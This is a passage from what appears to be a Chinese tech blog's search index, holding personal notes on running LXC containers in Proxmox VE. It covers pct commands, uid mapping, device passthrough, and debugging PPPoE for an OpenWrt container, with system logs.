\u53ea\u80fd\u901a\u8fc7 webui upload?</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pct-\u547d\u4ee4\u884c","title":"PCT \u547d\u4ee4\u884c","text":"<p>Linux Container - Proxmox VE pct(1) (proxmox.com)</p> <pre><code>pct list\npct console &lt;vmid&gt; [OPTIONS]\npct enter &lt;vmid&gt;\n\npct start\n\npct destroy 100 --purge # --purge_, if you want to additionally remove the container from replication jobs, backup jobs and HA resource configurations.\n</code></pre> <pre><code># pct set 100 -net0 name=eth0,bridge=vmbr0,ip=192.168.15.147/24,gw=192.168.15.1\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#set-\u4fee\u6539-hostname","title":"set \u4fee\u6539 hostname","text":"<p>\u5728\u5bb9\u5668\u5185\u4fee\u6539 hostname \u91cd\u542f\u540e\u4f1a\u5931\u6548\uff0c\u9700\u8981\u4f7f\u7528 pct \u547d\u4ee4\u884c\u4fee\u6539</p> <pre><code>pct set 110 --hostname docker\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#ummanged-os","title":"ummanged OS","text":"<p>\u7f51\u9875\u521b\u5efa openwrt \u53ef\u80fd\u9047\u5230\u4ee5\u4e0b\u9519\u8bef</p> <pre><code>TASK ERROR: unable to create CT 100 - unable to detect OS distribution\n</code></pre> <p>\u9700\u8981\u4f7f\u7528<code>ummanged</code>\u7c7b\u578b\uff0c\u53ea\u80fd\u4f7f\u7528\u547d\u4ee4\u884c\u64cd\u4f5c</p> <p>unmanaged\u00a0can be used to skip and OS specific setup</p> <p>lvm</p> <pre><code>pct create 100 /mnt/ryzen-pve-storage/template/cache/openwrt-23.05.0-x86-64-rootfs.tar.gz \\\n--storage local-lvm \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--hostname op1 \\\n--rootfs local-lvm:8 \\\n--cores 4 \\\n--memory 1024 \\\n--swap 1024 \\\n--features keyctl=1,nesting=1\n\n--password xxxx\n</code></pre> <p>zfs</p> <pre><code>pct create 700 local:vztmpl/openwrt-23.05.0-x86-64-generic-rootfs.tar.gz \\\n--storage local-zfs \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--hostname op1 \\\n--rootfs local-zfs:1 \\\n--cores 4 \\\n--memory 1024 \\\n--swap 0 \\\n--features keyctl=1,nesting=1\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u914d\u7f6e\u6587\u4ef6_2","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>/etc/pve/lxc/&lt;CTID&gt;.conf\n</code></pre> <p>Currently there are three types of mount points: storage backed mount points, bind mounts, and device mounts.</p> <ul> <li>Storage Backed Mount Points<ul> <li>Image based</li> <li>ZFS subvolumes</li> <li>Directories</li> </ul> </li> </ul> <pre><code>pct set 100 -mp0 thin1:10,mp=/path/in/container\n</code></pre> <ul> <li>Bind Mount Points: Bind mounts allow you to access arbitrary directories from your Proxmox VE host inside a container</li> </ul> <pre><code>pct set 100 -mp0 /mnt/bindmounts/shared,mp=/shared\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7279\u6743\u5bb9\u5668","title":"\u7279\u6743\u5bb9\u5668","text":"","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7279\u6743\u5bb9\u5668\u8f6c\u975e\u7279\u6743\u5bb9\u5668","title":"\u7279\u6743\u5bb9\u5668\u8f6c\u975e\u7279\u6743\u5bb9\u5668","text":"<p>Convert privileged to unprivileged container | Proxmox Support Forum</p> <pre><code>pct restore 1234 var/lib/vz/dump/vzdump-lxc-1234-2016_03_02-02_31_03.tar.gz -ignore-unpack-errors 1 -unprivileged\n</code></pre> <p>\u8f6c\u4e2a\u7279\u6743\u7ea7\u7ed3\u679c\u8fd9\u4e48\u9ebb\u70e6\u3002community\u6709\u901a\u8fc7\u6302\u8f7d\u955c\u50cf\uff0c\u7136\u540e\u4fee\u6539\u5176\u5185\u5bb9\u7684\u65b9\u6cd5\uff0c\u4f46\u662f\u770b\u4e0a\u53bb\u8c8c\u4f3c\u6709\u70b9\u91ce\uff0c\u56e0\u6b64\u8fd8\u662f\u4e0d\u4f7f\u7528\u4e86\u3002</p> <p>\u5c1d\u8bd5\u4e86</p> <ul> <li>\u7f16\u8f91\u914d\u7f6e\u6587\u4ef6\u76f4\u63a5\u6dfb\u52a0 unprivileged: yes\u3002\u4f46\u662f\u6253\u5f00\u5bb9\u5668\u540e\uff0c\u6240\u6709\u6587\u4ef6\u90fd\u53d8\u6210\u4e86 nobody\u3002\uff08\u4e5f\u8bb8\u624b\u52a8 chown \u4ee5\u4e0b\u5c31\u53ef\u4ee5\u4e86\uff1f\uff09</li> <li>\u5c1d\u8bd5\u6309\u7167\u5b98\u65b9\u901a\u8fc7 backup \u6062\u590d\u3002<ul> <li>\u4f46\u662f\u6062\u590d\u540e\uff0cjellyfin docker \u542f\u52a8\u4e0d\u8d77\u6765\uff0c\u8c8c\u4f3c\u662f\u6743\u9650\u7684\u95ee\u9898\u3002jellyfin \u914d\u7f6e\u6587\u4ef6\u4e0d\u77e5\u4e3a\u4f55\u5c31\u662f\u65e0\u6cd5 chown\uff0croot \u7528\u6237 chown \u7ed3\u679c\u62a5\u6ca1\u6709\u6743\u9650\u3002</li> </ul> </li> </ul> <pre><code>pct restore 111 /var/lib/vz/dump/vzdump-lxc-110-2023_09_29-23_05_38.tar.zst -ignore-unpack-errors 1 -unprivileged --features keyctl=1,nesting=1  --storage local-zfs\n</code></pre> <p>\u7b97\u4e86\uff0c\u8fd8\u662f\u7528\u539f\u6765\u7279\u6743\u5bb9\u5668\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8def\u5f84\u6620\u5c04\u6302\u8f7d","title":"\u8def\u5f84\u6620\u5c04\uff08\u6302\u8f7d\uff09","text":"<p>\u53c2\u8003</p> <ul> <li>Proxmox: bind mountpoint from host to unprivileged LXC container :: It's Embedded! (itsembedded.com)</li> <li>Unprivileged LXC containers - Proxmox VE</li> </ul> <p>Bind mounting\uff1a\u7c7b\u4f3c\u4e8e\u76ee\u5f55\u7684\u786c\u94fe\u63a5\uff08linux \u76ee\u5f55\u4e0d\u80fd\u786c\u94fe\u63a5\uff09</p> <p>\u76f4\u63a5\u6620\u5c04\uff08\u57fa\u672c\u4e0a\u53ea\u8bfb\uff09</p> <ul> <li>\u9700\u8981\u91cd\u542f\u5bb9\u5668\u751f\u6548</li> <li>host \u521b\u5efa\u7684\u6587\u4ef6\u5728 guest \u4e2d\u4e3a nobody\uff08\u53ea\u8981\u6587\u4ef6\u6743\u9650\u4e0d\u4e25\u683c\uff0c\u5e94\u8be5\u662f\u53ef\u8bfb\u7684\uff09</li> <li>guest \u521b\u5efa\u7684\u6587\u4ef6\u5728 host \u4e0a\u4e3a high-mapped(100000+)  uid</li> </ul> <pre><code># pct\u547d\u4ee4\npct set 300 -mp0 /mnt/Disk2/BT/downloads/links,mp=/media\n\n# \u914d\u7f6e\u6587\u4ef6\nmp0: /mnt/bindmounts/shared,mp=/shared\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u7528\u6237\u6620\u5c04","title":"\u7528\u6237\u6620\u5c04","text":"<p>\u7f16\u8f91\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6</p> <ul> <li>0 100000 1005 \u8868\u793a 0 \u5f00\u59cb\u7684 1005 \u957f\u5ea6\u6bb5\u6620\u5c04\u5230 host 10000 \u5f00\u59cb 1005 \u957f\u5ea6\u6bb5</li> <li>\u4ee5\u4e0b\u914d\u7f6e\u5c06 1005 \u5355\u72ec\u6620\u5c04\u5230 host 1005</li> </ul> <pre><code># uid map: from uid 0 map 1005 uids (in the ct) to the range starting 100000 (on the host), so 0..1004 (ct) \u2192 100000..101004 (host)\nlxc.idmap = u 0 100000 1005\nlxc.idmap = g 0 100000 1005\n# we map 1 uid starting from uid 1005 onto 1005, so 1005 \u2192 1005\nlxc.idmap = u 1005 1005 1\nlxc.idmap = g 1005 1005 1\n# we map the rest of 65535 from 1006 upto 101006, so 1006..65535 \u2192 101006..165535\nlxc.idmap = u 1006 101006 64530\nlxc.idmap = g 1006 101006 64530\n</code></pre> <pre><code>lxc.idmap = u 0 100000 1000\nlxc.idmap = g 0 100000 1000\nlxc.idmap = u 1000 1000 1\nlxc.idmap = g 1000 1000 1\nlxc.idmap = u 1001 101001 64534\nlxc.idmap = g 1001 101001 64534\n</code></pre> <p>\u7f16\u8f91/etc/suuid(subgid)\uff0c\u4f7f\u5f97 root \u7528\u6237\u5141\u8bb8\u4f7f\u7528 1000 \u7684 uid</p> <pre><code>root:100000:65536\nroot:1000:1\n</code></pre> <p>\u5426\u5219\u4f1a\u62a5\u5982\u4e0b\u9519\u8bef</p> <pre><code>lxc_map_ids: 3701 newuidmap failed to write mapping \"newuidmap: uid range [1000-1001) -&gt; [1000-1001) not allowed\": newuidmap 793824 0 100000 1000 1000 1000 1 1001 101001 64534  \nlxc_spawn: 1788 Failed to set up id mapping.  \n__lxc_start: 2107  \nTASK ERROR: startup for container '110' failed\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u6dfb\u52a0-gpu","title":"\u6dfb\u52a0 gpu","text":"<p>\u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0</p> <pre><code>lxc.cgroup2.devices.allow: c 226:0 rwm\nlxc.cgroup2.devices.allow: c 226:128 rwm\nlxc.cgroup2.devices.allow: c 29:0 rwm\nlxc.mount.entry: /dev/dri dev/dri none bind,optional,create=dir\nlxc.mount.entry: /dev/fb0 dev/fb0 none bind,optional,create=file\nlxc.apparmor.profile: unconfined\n</code></pre> <p>lxc.cgroup2.devices.allow \u8bbe\u7f6e\u5141\u8bb8\u5728 LXC \u5bb9\u5668\u4e2d\u4f7f\u7528\u7684\u8bbe\u5907\u89c4\u5219</p> <ul> <li><code>c</code> \u8868\u793a\u5b57\u7b26\u8bbe\u5907\u3002</li> <li><code>195:*</code> \u662f\u4e00\u4e2a\u8bbe\u5907\u89c4\u5219\uff0c\u5b83\u6307\u5b9a\u4e86\u4e00\u7ec4\u5141\u8bb8\u7684\u5b57\u7b26\u8bbe\u5907\u3002\u5728\u8fd9\u91cc\uff0c<code>195</code> \u662f\u4e3b\u8bbe\u5907\u53f7\uff08major number\uff09\uff0c\u800c <code>*</code> \u8868\u793a\u5141\u8bb8\u4efb\u4f55\u6b21\u8bbe\u5907\u53f7\uff08minor number\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5141\u8bb8\u4f7f\u7528\u4e3b\u8bbe\u5907\u53f7\u4e3a 195 \u7684\u6240\u6709\u5b57\u7b26\u8bbe\u5907\u3002</li> <li><code>rwm</code> \u8868\u793a\u6743\u9650\u8bbe\u7f6e\uff0c<code>r</code> \u8868\u793a\u5141\u8bb8\u8bfb\u53d6\uff0c<code>w</code> \u8868\u793a\u5141\u8bb8\u5199\u5165\uff0c<code>m</code> \u8868\u793a\u5141\u8bb8\u521b\u5efa\u8bbe\u5907\u6587\u4ef6\u3002</li> </ul> <p><code>lxc.mount.entry: /dev/dri dev/dri none bind,optional,create=dir</code></p> <ul> <li>\u8fd9\u4e2a\u914d\u7f6e\u6761\u76ee\u5c06\u4e3b\u673a\u4e0a\u7684 <code>/dev/dri</code> \u76ee\u5f55\u6302\u8f7d\u5230 LXC \u5bb9\u5668\u5185\u7684 <code>dev/dri</code> \u76ee\u5f55\u3002</li> <li><code>none</code> \u8868\u793a\u6ca1\u6709\u7279\u5b9a\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u3002</li> <li><code>bind</code> \u8868\u793a\u4f7f\u7528\u7ed1\u5b9a\u6302\u8f7d\uff08bind mount\uff09\uff0c\u8fd9\u610f\u5473\u7740\u5bb9\u5668\u5185\u7684 <code>dev/dri</code> \u76ee\u5f55\u4f1a\u6620\u5c04\u5230\u4e3b\u673a\u4e0a\u7684 <code>/dev/dri</code> \u76ee\u5f55\uff0c\u5bb9\u5668\u5185\u7684\u64cd\u4f5c\u5c06\u5f71\u54cd\u5230\u4e3b\u673a\u4e0a\u7684\u8bbe\u5907\u3002</li> <li><code>optional</code> \u8868\u793a\u8fd9\u4e2a\u6302\u8f7d\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c <code>/dev/dri</code> \u5728\u4e3b\u673a\u4e0a\u4e0d\u5b58\u5728\uff0c\u5bb9\u5668\u4ecd\u7136\u4f1a\u542f\u52a8\u3002</li> <li><code>create=dir</code> \u8868\u793a\u5982\u679c\u5bb9\u5668\u5185\u7684\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u5728\u5bb9\u5668\u5185\u521b\u5efa\u4e00\u4e2a\u76ee\u5f55\u3002</li> <li><code>create=file</code> \u8868\u793a\u5982\u679c\u5bb9\u5668\u5185\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u5728\u5bb9\u5668\u5185\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6</li> </ul> <p>AppArmor \u662f\u4e00\u4e2a Linux \u5185\u6838\u5b89\u5168\u6a21\u5757\uff0c\u7528\u4e8e\u9650\u5236\u7a0b\u5e8f\u7684\u80fd\u529b\uff0c\u5305\u62ec\u5bb9\u5668\uff0c\u4ee5\u589e\u5f3a\u5b89\u5168\u6027\u3002 <code>lxc.apparmor.profile</code> \u88ab\u8bbe\u7f6e\u4e3a \"unconfined\"\uff0c\u8fd9\u610f\u5473\u7740\u5bb9\u5668\u4e0d\u53d7 AppArmor \u4e2a\u4eba\u8d44\u6599\u7684\u9650\u5236\u3002\u5b83\u6709\u66f4\u591a\u81ea\u7531\uff0c\u4f46\u4e5f\u6709\u8f83\u5c11\u7684\u5b89\u5168\u9650\u5236\u3002</p>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#openwrt","title":"openwrt","text":"<p>LXC \u4f18\u70b9</p> <ul> <li>\u5bb9\u5668\u5185\u7684\u6587\u4ef6\u7cfb\u7edf\u5728 host \u4e2d\u53ef\u4ee5\u76f4\u63a5\u770b\u5230\uff0c\u865a\u62df\u673a\u78c1\u76d8\u662f\u4e2a\u955c\u50cf\uff0c\u9700\u8981\u81ea\u5df1 mount\u3002</li> <li>\u4e0d\u6d89\u53ca\u5230 boot\uff0c\u5907\u4efd\u65f6\u53ea\u9700\u8981\u4fdd\u7559 rootfs \u5373\u53ef\u3002</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u975e\u7279\u6743\u5bb9\u5668\u5f00\u542f\u6743\u9650","title":"\u975e\u7279\u6743\u5bb9\u5668\u5f00\u542f\u6743\u9650","text":"<ul> <li>ppp (pppoe)</li> <li>tun(openvpn, clash)</li> </ul> <pre><code>lxc.apparmor.profile: unconfined\nlxc.cgroup.devices.allow: a\nlxc.cap.drop:\nlxc.cgroup2.devices.allow: c 10:200 rwm\nlxc.mount.entry: /dev/net dev/net none bind,create=dir\nlxc.cgroup2.devices.allow: c 108:0 rwm\nlxc.mount.entry: /dev/ppp dev/ppp none bind,create=file\n</code></pre> <pre><code>ppp_async\nppp_generic\nppp_mppe\npppoatm\npppoe\npppox\nslhc\ntun\n</code></pre> <pre><code>root@n5105-pve \u279c  ~ lsmod |grep pp\npppoe                  20480  0\npptp                   24576  0\npppox                  12288  2 pppoe,pptp\nppp_synctty            16384  0\npppoatm                16384  0\natm                    77824  1 pppoatm\nppp_async              16384  0\nppp_deflate            12288  0\nppp_mppe               12288  0\nlibarc4                12288  1 ppp_mppe\ngre                    12288  3 ip6_gre,ip_gre,pptp\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#rootfs-\u83b7\u53d6","title":"rootfs \u83b7\u53d6","text":"<ul> <li>download openwrt \u5904\u4e0b\u8f7d</li> <li>\u4f7f\u7528imagebuilder\u521b\u5efa</li> </ul> <p>\u5bfc\u5165\u955c\u50cf\u65b9\u6cd5\uff1a</p> <ul> <li>\u4eceweb\u4e0a\u4f20</li> <li>move\uff1a<code>mv op2-openwrt-23.05.0-x86-64-generic-rootfs.tar.gz /var/lib/vz/template/cache/</code></li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u521b\u5efalxc-\u5bb9\u5668","title":"\u521b\u5efaLXC \u5bb9\u5668","text":"<p>\u4ece openwrt \u4e0b\u8f7d\u7684 rootfs \u65e0\u6cd5\u521b\u5efa lxc \u5bb9\u5668\u4e86</p> <pre><code>TASK ERROR: unable to create CT 102 - unable to detect OS distribution\n</code></pre> <p>\u5fc5\u987b\u547d\u4ee4\u884c\u8bbe\u7f6e ostype</p> <pre><code>pct create 102 local:vztmpl/op2-openwrt-23.05.0-x86-64-generic-rootfs.tar.gz \\\n--storage local-zfs \\\n--ostype unmanaged \\\n--unprivileged 1 \\\n--arch amd64 \\\n--hostname op9 \\\n--rootfs local-zfs:1 \\\n--cores 4 \\\n--memory 512 \\\n--swap 0 \\\n--features keyctl=1,nesting=1\n</code></pre>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#pppoe-\u7684\u5751","title":"pppoe \u7684\u5751","text":"<p>\u603b\u7ed3</p> <ul> <li>host \u9700\u8981 modprobe \u6240\u6709 pppoe \u7684\u5305\u3002\u53ef\u4ee5\u914d\u7f6e\u5728 <code>/etc/modules</code> \u4e2d</li> <li>\u975e\u7279\u6743 openwrt \u5bb9\u5668\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u914d\u7f6e ppp devices<ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6743\u9650\u4e3a 600, nobody, nobody\uff0c\u5bfc\u81f4 Permission denied \u9519\u8bef<ul> <li>\u53ef\u4ee5 host chmod 666 /dev/ppp</li> <li>\u6216\u8005 device hook\uff08\u8be5\u65b9\u6cd5\u6000\u7591\u5df2\u7ecf\u8fc7\u65f6\uff0c\u6d4b\u8bd5 Proxmox VE 8.1.4 x86_64, 6.5.13-1-pve \u65e0\u6cd5\u542f\u52a8\u5bb9\u5668\uff0c\u62a5\u9519\u8fd0\u884c hook \u5931\u8d25\uff09</li> </ul> </li> </ul> </li> </ul> <pre><code>lxc.hook.autodev: /var/lib/lxc/199/device_hook.sh\n</code></pre> <pre><code>mkdir -p ${LXC_ROOTFS_MOUNT}/dev/net\nmknod -m 666 /${LXC_ROOTFS_MOUNT}/dev/ppp c 108 0\nmknod -m 666 /${LXC_ROOTFS_MOUNT}/dev/net/tun c 10 200\n</code></pre> <p>systemctl edit fix-ppp</p> <pre><code>[Unit]\nDescription=Fix lxc openwrt pppoe by chmod 666 ppp device\nAfter=multi-user.target\n\n[Service]\nType=oneshot\nExecStart=/bin/chmod 666 /dev/ppp\nRemainAfterExit=true\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>\u53c2\u8003\u8d44\u6599</p> <ul> <li>fw867/pve-edge-kernel: Newer Linux kernels for Proxmox VE (github.com)<ul> <li>\u5176\u4e2d\u4e00\u4e9bShell\u811a\u672c\u5305\u542b\u8bb8\u591a\u91cd\u8981\u7684\u914d\u7f6e</li> </ul> </li> <li>[SOLVED] - PVE 7 - How to make all new CTs have PPP enabled | Proxmox Support Forum<ul> <li>\u4e5f\u9047\u5230\u4e86 <code>Couldn't open the /dev/ppp device: Operation not permitted</code></li> <li>\u63d0\u5230\u4f7f\u7528 cgroup2 \u53ef\u4ee5\u89e3\u51b3</li> <li>\u6709\u4eba\u8865\u5145\u8fd8\u9700\u8981 host <code>chown 100000:100000 /dev/ppp</code></li> </ul> </li> <li>autodev \u5df2\u7ecf\u4e0d\u9700\u8981\u4e86\uff0c\u6539\u7528 entry \u4e86\u3002lxc.audodev=1 doesn't work with unprivileged LXC container? : r/Proxmox (reddit.com)</li> </ul>","tags":["pve","\u865a\u62df\u5316"]},{"location":"%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%85%B7/2023/09/15/2023-09-15-PVE/#\u8c03\u8bd5\u8fc7\u7a0b","title":"\u8c03\u8bd5\u8fc7\u7a0b","text":"<p>\u521a\u5f00\u59cb\u62a5\u9519\u5982\u4e0b\u3002\u8fd9\u91cc\u5176\u5b9e\u6709 <code>no module folders for kernel version 6.5.13-1-pve found</code> \u548c <code>Couldn't open the /dev/ppp device: Permission denied</code> \u4e24\u4e2a\u9519\u8bef\u3002</p> <pre><code>Wed Jun 12 19:13:54 2024 daemon.notice netifd: Interface 'wan' is now down\nWed Jun 12 19:13:54 2024 daemon.notice netifd: Interface 'wan' is setting up now\nWed Jun 12 19:13:54 2024 daemon.err modprobe: no module folders for kernel version 6.5.13-1-pve found\nWed Jun 12 19:13:54 2024 daemon.info pppd[143974]: Plugin pppoe.so loaded.\nWed Jun 12 19:13:54 2024 daemon.info pppd[143974]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:13:54 2024 daemon.err pppd[143974]: Couldn't open the /dev/ppp device: Permission denied\nWed Jun 12 19:13:54 2024 daemon.err pppd[143974]: Sorry - this system lacks PPP kernel support\nWed Jun 12 19:13:54 2024 daemon.notice netifd: wan (143974): /usr/sbin/pppd: Sorry - this system lacks PPP kernel support\nWed Jun 12 19:13:54 2024 daemon.notice netifd: wan (143974):\n</code></pre> <p>n4500 \u4e0a\u4f7f\u7528\u4e86\u7279\u6743\u5bb9\u5668\uff0c\u56e0\u6b64 600 \u7684\u6743\u9650\u662f\u6ca1\u95ee\u9898\u7684\u3002\u4f46\u662f \u975e\u7279\u6743\u5bb9\u5668 owner \u4e3a nobody nogroup\u3002</p> <pre><code>root@n4500 \u279c  ~ l /dev/ppp\ncrw------- 1 root root 108, 0 Jun 11 11:44 /dev/ppp\n\nroot@op3 \u279c  ~ l /dev/ppp\ncrw-------    1 root     root      108,   0 Jun 11 11:45 /dev/ppp\n</code></pre> <p>\u5c1d\u8bd5\u6539\u4e3a\u4f7f\u7528 cgroup2\uff0c\u8fd8\u662f\u4e0d\u884c\u3002pve <code>chmod 777 /dev/ppp</code> \u62a5\u9519\u53d8\u4e86\u3002</p> <pre><code>Wed Jun 12 19:28:09 2024 daemon.warn pppd[149937]: Timeout waiting for PADS packets\nWed Jun 12 19:28:09 2024 daemon.err pppd[149937]: Unable to complete PPPoE Discovery\nWed Jun 12 19:28:09 2024 daemon.info pppd[149937]: Exit.\nWed Jun 12 19:28:09 2024 daemon.info pppd[150272]: Plugin pppoe.so loaded.\nWed Jun 12 19:28:09 2024 daemon.info pppd[150272]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:28:09 2024 daemon.notice pppd[150272]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:28:24 2024 daemon.warn pppd[150272]: Timeout waiting for PADS packets\nWed Jun 12 19:28:24 2024 daemon.err pppd[150272]: Unable to complete PPPoE Discovery\nWed Jun 12 19:28:24 2024 daemon.info pppd[150272]: Exit.\nWed Jun 12 19:28:24 2024 daemon.info pppd[150823]: Plugin pppoe.so loaded.\nWed Jun 12 19:28:24 2024 daemon.info pppd[150823]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:28:24 2024 daemon.notice pppd[150823]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:28:34 2024 daemon.err pppd[150823]: select (waitForPADS): Interrupted system call\nWed Jun 12 19:28:34 2024 daemon.warn pppd[150823]: Timeout waiting for PADS packets\nWed Jun 12 19:28:34 2024 daemon.err pppd[150823]: Unable to complete PPPoE Discovery\nWed Jun 12 19:28:34 2024 daemon.info pppd[150823]: Exit.\nWed Jun 12 19:28:34 2024 daemon.info pppd[151126]: Plugin pppoe.so loaded.\nWed Jun 12 19:28:34 2024 daemon.info pppd[151126]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:28:34 2024 daemon.notice pppd[151126]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:28:49 2024 daemon.warn pppd[151126]: Timeout waiting for PADS packets\nWed Jun 12 19:28:49 2024 daemon.err pppd[151126]: Unable to complete PPPoE Discovery\nWed Jun 12 19:28:49 2024 daemon.info pppd[151126]: Exit.\nWed Jun 12 19:28:49 2024 daemon.info pppd[151487]: Plugin pppoe.so loaded.\nWed Jun 12 19:28:49 2024 daemon.info pppd[151487]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:28:49 2024 daemon.notice pppd[151487]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:29:04 2024 daemon.warn pppd[151487]: Timeout waiting for PADS packets\nWed Jun 12 19:29:04 2024 daemon.err pppd[151487]: Unable to complete PPPoE Discovery\nWed Jun 12 19:29:04 2024 daemon.info pppd[151487]: Exit.\nWed Jun 12 19:29:04 2024 daemon.info pppd[151787]: Plugin pppoe.so loaded.\nWed Jun 12 19:29:04 2024 daemon.info pppd[151787]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:29:04 2024 daemon.notice pppd[151787]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:29:19 2024 daemon.warn pppd[151787]: Timeout waiting for PADS packets\nWed Jun 12 19:29:19 2024 daemon.err pppd[151787]: Unable to complete PPPoE Discovery\nWed Jun 12 19:29:19 2024 daemon.info pppd[151787]: Exit.\nWed Jun 12 19:29:19 2024 daemon.info pppd[152103]: Plugin pppoe.so loaded.\nWed Jun 12 19:29:19 2024 daemon.info pppd[152103]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:29:19 2024 daemon.notice pppd[152103]: pppd 2.4.9 started by root, uid 0\n</code></pre> <p>modprobe \u4ee5\u4e0b kernel \u540e\u89e3\u51b3\u3002\uff08\u8d77\u56e0\u662f\u522b\u4eba\u7684\u62a5\u9519\u4e2d\u6ca1\u6709 kernel module \u76f8\u5173\u4fe1\u606f\uff0c\u5e76\u4e14\u6211\u53d1\u73b0 kernel \u76ee\u5f55\u4e0b\u6709\u5176\u5b83 ko \u6587\u4ef6\uff09</p> <pre><code>bsd_comp\nppp_synctty\npptp\n</code></pre> <pre><code>root@n5105-pve \u279c  ~ l /lib/modules/6.5.13-1-pve/kernel/drivers/net/ppp/\ntotal 88K\n-rw-r--r-- 1 root root 22K Feb  5 21:50 bsd_comp.ko\n-rw-r--r-- 1 root root 29K Feb  5 21:50 ppp_async.ko\n-rw-r--r-- 1 root root 19K Feb  5 21:50 ppp_deflate.ko\n-rw-r--r-- 1 root root 22K Feb  5 21:50 ppp_mppe.ko\n-rw-r--r-- 1 root root 40K Feb  5 21:50 pppoe.ko\n-rw-r--r-- 1 root root 15K Feb  5 21:50 pppox.ko\n-rw-r--r-- 1 root root 27K Feb  5 21:50 ppp_synctty.ko\n-rw-r--r-- 1 root root 28K Feb  5 21:50 pptp.ko\n</code></pre> <pre><code>Wed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Terminating on signal 15\nWed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Connect time 2.6 minutes.\nWed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Sent 2342096 bytes, received 636835 bytes.\nWed Jun 12 19:35:30 2024 daemon.notice pppd[156589]: Connection terminated.\nWed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Connect time 2.6 minutes.\nWed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Sent 2342096 bytes, received 636835 bytes.\nWed Jun 12 19:35:30 2024 daemon.info pppd[156589]: Exit.\nWed Jun 12 19:35:30 2024 daemon.info pppd[158315]: Plugin pppoe.so loaded.\nWed Jun 12 19:35:30 2024 daemon.info pppd[158315]: PPPoE plugin from pppd 2.4.9\nWed Jun 12 19:35:30 2024 daemon.notice pppd[158315]: pppd 2.4.9 started by root, uid 0\nWed Jun 12 19:35:35 2024 daemon.info pppd[158315]: PPP session is 4826\nWed Jun 12 19:35:35 2024 daemon.warn pppd[158315]: Connected to 00:00:5e:00:01:98 via interface eth0\nWed Jun 12 19:35:35 2024 daemon.info pppd[158315]: Renamed interface ppp0 to pppoe-wan\nWed Jun 12 19:35:35 2024 daemon.info pppd[158315]: Using interface pppoe-wan\nWed Jun 12 19:35:35 2024 daemon.notice pppd[158315]: Connect: pppoe-wan &lt;--&gt; eth0\nWed Jun 12 19:35:38 2024 daemon.info pppd[158315]: CHAP authentication succeeded: Authentication success,Welcome!\nWed Jun 12 19:35:38 2024 daemon.notice pppd[158315]: CHAP authentication succeeded\nWed Jun 12 